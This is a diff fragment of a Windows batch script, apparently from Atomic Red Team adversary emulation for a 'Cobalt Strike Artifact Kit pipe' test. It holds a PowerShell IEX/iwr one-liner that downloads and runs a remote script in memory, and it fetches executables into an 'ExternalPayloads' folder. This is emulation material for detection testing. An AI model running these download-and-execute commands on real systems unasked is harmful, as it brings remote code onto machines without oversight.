@@ -113,4 +113,23 @@ rem Run the batch script
 call encoded_payload.ps1
 
 
+ Cobalt Strike Artifact Kit pipe
 
+ *
+ @echo off
+
+rem Create directory
+mkdir "PathToAtomicsFolder\..\ExternalPayloads" 2>nul
+
+rem Set TLS 1.2 for Invoke-WebRequest
+set "PSCommand=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
+powershell -Command "%PSCommand%"
+
+rem Download Invoke-FetchFromZip.ps1
+powershell -Command "IEX (iwr 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1' -UseBasicParsing)"
+
+rem Download and extract zip file
+set "zipUrl=https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip"
+powershell -Command "Invoke-FetchFromZip '%zipUrl%' '*.exe' 'PathToAtomicsFolder\..\ExternalPayloads'"
+
+ 
